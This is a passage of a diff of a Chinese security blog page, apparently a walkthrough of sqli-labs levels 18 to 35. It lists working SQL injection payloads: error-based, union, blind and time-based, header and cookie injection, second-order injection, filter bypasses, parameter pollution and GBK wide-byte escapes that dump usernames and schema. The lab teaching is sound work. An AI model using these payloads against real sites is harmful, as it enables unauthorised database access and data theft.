-      <p>此题过滤了—和#注释符，构造payload闭合 <code>?id=1&#39; and &#39;a&#39;=&#39;a</code>，继续获取文件路径<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;a</span><br></pre></td></tr></table></div></figure><br>获取表名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;a</span><br></pre></td></tr></table></div></figure><br>下面的不再演示，还可以报错注入，延时注入等<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure><br>延时注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-24">
-          <a href="#LESS-24" class="heading-link"><i class="fas fa-link"></i></a>LESS-24</h1>
-      <p>本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。<br>先创建一个用户<code>admin&#39;#</code>，如果修改密码，则会将admin用户的密码修改。SQL语句就变为<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> paddwd=<span class="string">'new_pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="comment">#' and password='</span></span><br></pre></td></tr></table></div></figure><br>相当于执行了<code>update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;</code>，从而更改了用户名。</p>
-
-        <h1 id="LESS-25">
-          <a href="#LESS-25" class="heading-link"><i class="fas fa-link"></i></a>LESS-25</h1>
-      <p>单引号闭合联合注入<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'a</span></span><br></pre></td></tr></table></div></figure><br>本题要绕过and和or，有常用的几个方法</p>
+<h1 id="LESS-18"><a href="#LESS-18" class="headerlink" title="LESS-18"></a>LESS-18</h1><p>截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。<br>修改User-Agent，利用报错进行注入<br>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
+<p>这个在本题不可以用，但是可以报错，<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-19"><a href="#LESS-19" class="headerlink" title="LESS-19"></a>LESS-19</h1><p>只是将注入位置换为referer即可</p>
+<h1 id="LESS-20"><a href="#LESS-20" class="headerlink" title="LESS-20"></a>LESS-20</h1><p>用cookie注入,这里我用的是火狐的Cookie Manager插件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><br>然后可以继续注入获取全部内容。</p>
+<h1 id="LESS-21"><a href="#LESS-21" class="headerlink" title="LESS-21"></a>LESS-21</h1><p>本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb') and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><br>再用base64编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-22"><a href="#LESS-22" class="headerlink" title="LESS-22"></a>LESS-22</h1><p>与21关相同只是闭合方式变成了双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-23"><a href="#LESS-23" class="headerlink" title="LESS-23"></a>LESS-23</h1><p>此题过滤了—和#注释符，构造payload闭合 <code>?id=1&#39; and &#39;a&#39;=&#39;a</code>，继续获取文件路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;a</span><br></pre></td></tr></table></figure><br>获取表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;a</span><br></pre></td></tr></table></figure><br>下面的不再演示，还可以报错注入，延时注入等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure><br>延时注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-24"><a href="#LESS-24" class="headerlink" title="LESS-24"></a>LESS-24</h1><p>本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。<br>先创建一个用户<code>admin&#39;#</code>，如果修改密码，则会将admin用户的密码修改。SQL语句就变为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> paddwd=<span class="string">'new_pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="comment">#' and password='</span></span><br></pre></td></tr></table></figure><br>相当于执行了<code>update users set password=&#39;$new_pass&#39; where username=&#39;admin&#39;</code>，从而更改了用户名。</p>
+<h1 id="LESS-25"><a href="#LESS-25" class="headerlink" title="LESS-25"></a>LESS-25</h1><p>单引号闭合联合注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'a</span></span><br></pre></td></tr></table></figure><br>本题要绕过and和or，有常用的几个方法</p>
 <blockquote>
 <p>(1)大小写变形，如Or,oR,OR<br>(2)编码，hex,urlencode<br>(3)添加注释/*or*/<br>(4)利用符号 and=&amp;&amp; ,or=||<br>(5)重复输入anandd</p>
 </blockquote>
-<p>利用方法4<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' || updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) || <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-25a">
-          <a href="#LESS-25a" class="heading-link"><i class="fas fa-link"></i></a>LESS-25a</h1>
-      <p>本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-26">
-          <a href="#LESS-26" class="heading-link"><i class="fas fa-link"></i></a>LESS-26</h1>
-      <p>由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1</span><br></pre></td></tr></table></div></figure></p>
-<p>然后继续注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></div></figure></p>
+<p>利用方法4<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' || updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) || <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-25a"><a href="#LESS-25a" class="headerlink" title="LESS-25a"></a>LESS-25a</h1><p>本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-26"><a href="#LESS-26" class="headerlink" title="LESS-26"></a>LESS-26</h1><p>由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1</span><br></pre></td></tr></table></figure></p>
+<p>然后继续注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure></p>
 <p>对于空格常用的方法为：</p>
 <div class="table-container">
-<div class="table-container"><table>
+<table>
 <thead>
 <tr>
 <th style="text-align:center">编码</th>
@@ -183,47 +187,20 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <td style="text-align:center">空格</td>
 </tr>
 </tbody>
-</table></div>
+</table>
 </div>
-
-        <h1 id="LESS-26a">
-          <a href="#LESS-26a" class="heading-link"><i class="fas fa-link"></i></a>LESS-26a</h1>
-      <p>本关无法回显错误，无法使用报错注入，还有闭合方式为 <code>?id=1&#39;)</code><br>盲注payload：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;anandd(select(substr((select(database())),1,1)))&#x3D;&#39;s</span><br></pre></td></tr></table></div></figure><br>联合注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)union(select(1),(user()),&#39;1</span><br></pre></td></tr></table></div></figure><br>爆用户名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)union(select(1),group_concat(username),(2)from(users)where(1&#x3D;1))union(select(1),(2),&#39;a</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-27">
-          <a href="#LESS-27" class="heading-link"><i class="fas fa-link"></i></a>LESS-27</h1>
-      <p>本题过滤了select和上关的字符，可以大小写混合绕过<br>报错注入payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;database())))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-27a">
-          <a href="#LESS-27a" class="heading-link"><i class="fas fa-link"></i></a>LESS-27a</h1>
-      <p>本题双引号闭合，无法报错。盲注payload：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot;||(SelEct(substr((SelecT(database())),1,1)))&#x3D;&quot;s</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-28">
-          <a href="#LESS-28" class="heading-link"><i class="fas fa-link"></i></a>LESS-28</h1>
-      <p>与前面没有太大区别，盲注payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;888&#39;)||(SelecT(substr((SelEct(database())),1,1)))&#x3D;(&#39;s</span><br></pre></td></tr></table></div></figure></p>
-<p>联合注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;888&#39;)unIon(Select(1),database(),&#39;a</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-28a">
-          <a href="#LESS-28a" class="heading-link"><i class="fas fa-link"></i></a>LESS-28a</h1>
-      <p>本题知识简单过滤了union等符号，联合注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)unIon(SeLect 1,database(),&#39;3</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-29">
-          <a href="#LESS-29" class="heading-link"><i class="fas fa-link"></i></a>LESS-29</h1>
-      <p>注意：本题的index.php页面没有任何防护，注册页面是在login.php页面</p>
-<p>在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-1&#39; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></div></figure><br>本关为HPP(http参数污染)攻击,具体参见百度</p>
-
-        <h1 id="LESS-30">
-          <a href="#LESS-30" class="heading-link"><i class="fas fa-link"></i></a>LESS-30</h1>
-      <p>与29关相同，只是闭合方式改为<code>&quot;</code><br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-1&quot; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-31">
-          <a href="#LESS-31" class="heading-link"><i class="fas fa-link"></i></a>LESS-31</h1>
-      <p>与前面的相同，只是闭合方式变了<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,database(),3--+</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="LESS-26a"><a href="#LESS-26a" class="headerlink" title="LESS-26a"></a>LESS-26a</h1><p>本关无法回显错误，无法使用报错注入，还有闭合方式为 <code>?id=1&#39;)</code><br>盲注payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;anandd(select(substr((select(database())),1,1)))&#x3D;&#39;s</span><br></pre></td></tr></table></figure><br>联合注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)union(select(1),(user()),&#39;1</span><br></pre></td></tr></table></figure><br>爆用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)union(select(1),group_concat(username),(2)from(users)where(1&#x3D;1))union(select(1),(2),&#39;a</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-27"><a href="#LESS-27" class="headerlink" title="LESS-27"></a>LESS-27</h1><p>本题过滤了select和上关的字符，可以大小写混合绕过<br>报错注入payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;database())))||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-27a"><a href="#LESS-27a" class="headerlink" title="LESS-27a"></a>LESS-27a</h1><p>本题双引号闭合，无法报错。盲注payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot;||(SelEct(substr((SelecT(database())),1,1)))&#x3D;&quot;s</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-28"><a href="#LESS-28" class="headerlink" title="LESS-28"></a>LESS-28</h1><p>与前面没有太大区别，盲注payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;888&#39;)||(SelecT(substr((SelEct(database())),1,1)))&#x3D;(&#39;s</span><br></pre></td></tr></table></figure></p>
+<p>联合注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;888&#39;)unIon(Select(1),database(),&#39;a</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-28a"><a href="#LESS-28a" class="headerlink" title="LESS-28a"></a>LESS-28a</h1><p>本题知识简单过滤了union等符号，联合注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;555&#39;)unIon(SeLect 1,database(),&#39;3</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-29"><a href="#LESS-29" class="headerlink" title="LESS-29"></a>LESS-29</h1><p>注意：本题的index.php页面没有任何防护，注册页面是在login.php页面</p>
+<p>在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-1&#39; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></figure><br>本关为HPP(http参数污染)攻击,具体参见百度</p>
+<h1 id="LESS-30"><a href="#LESS-30" class="headerlink" title="LESS-30"></a>LESS-30</h1><p>与29关相同，只是闭合方式改为<code>&quot;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-1&quot; union select 1,group_concat(username),2 from users--+</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-31"><a href="#LESS-31" class="headerlink" title="LESS-31"></a>LESS-31</h1><p>与前面的相同，只是闭合方式变了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,database(),3--+</span><br></pre></td></tr></table></figure></p>
 <hr>
-
-        <h1 id="宽字节注入">
-          <a href="#宽字节注入" class="heading-link"><i class="fas fa-link"></i></a>宽字节注入</h1>
-      <p>原理：</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：</p>
 <blockquote>
 <p>mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤<code>&#39;</code>的时候，往往利用的思路是将<strong><code>\&#39;</code></strong>，因此我们的思路就是将’前面的\换掉。</p>
 </blockquote>
@@ -232,261 +209,81 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <p>1、%df吃掉\\，具体的原因是urlencode(\\’)=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。<br>2、将<code>%\*\*%5c%5c%27</code>的情况，后面%5c会被前面的%5c给注释掉</p>
 </blockquote>
 <hr>
+<h1 id="LESS-32"><a href="#LESS-32" class="headerlink" title="LESS-32"></a>LESS-32</h1><p>用第一种方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure><br>这个payload执行的sql语句是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from users where id&#x3D;&#39;-1運&#39;union select 1,user(),3;</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-33"><a href="#LESS-33" class="headerlink" title="LESS-33"></a>LESS-33</h1><p>这个和上一题没什么区别，同样的payload也可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27union select 1,2,@@basedir--+</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-34"><a href="#LESS-34" class="headerlink" title="LESS-34"></a>LESS-34</h1><p>本关是post型的注入漏洞，同样也是进行了<code>♦&#39;</code>，我们利用这个方式尝试。payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;♦&#39; or 1&#x3D;1#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure></p>
+<p>继续的话可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;♦&#39; union select 2,@@basedir#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-35"><a href="#LESS-35" class="headerlink" title="LESS-35"></a>LESS-35</h1><p>本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></figure><br>在后面的时候有个数字型注入，编码绕过即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure></p>
 
-        <h1 id="LESS-32">
-          <a href="#LESS-32" class="heading-link"><i class="fas fa-link"></i></a>LESS-32</h1>
-      <p>用第一种方法绕过<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27union%20select%201,user(),3--+</span><br></pre></td></tr></table></div></figure><br>这个payload执行的sql语句是<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from users where id&#x3D;&#39;-1運&#39;union select 1,user(),3;</span><br></pre></td></tr></table></div></figure></p>
+      
+    </div>
 
-        <h1 id="LESS-33">
-          <a href="#LESS-33" class="heading-link"><i class="fas fa-link"></i></a>LESS-33</h1>
-      <p>这个和上一题没什么区别，同样的payload也可以用<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27union select 1,2,@@basedir--+</span><br></pre></td></tr></table></div></figure></p>
+  </div>
 
-        <h1 id="LESS-34">
-          <a href="#LESS-34" class="heading-link"><i class="fas fa-link"></i></a>LESS-34</h1>
-      <p>本关是post型的注入漏洞，同样也是进行了<code>♦&#39;</code>，我们利用这个方式尝试。payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;♦&#39; or 1&#x3D;1#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></div></figure></p>
-<p>继续的话可以<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;♦&#39; union select 2,@@basedir#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></div></figure></p>
+  <div class="article-footer">
+    <div class="article-meta pull-left">
 
-        <h1 id="LESS-35">
-          <a href="#LESS-35" class="heading-link"><i class="fas fa-link"></i></a>LESS-35</h1>
-      <p>本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3#</span><br></pre></td></tr></table></div></figure><br>在后面的时候有个数字型注入，编码绕过即可<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></div></figure></p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2018/02/09/sqli-labs2/">http://chaosec.top/2018/02/09/sqli-labs2/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2018/02/09/mysql6/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">MySQL学习笔记(六)</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2018/02/07/mysql5/"><span class="paginator-prev__text">MySQL学习笔记(五)</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script 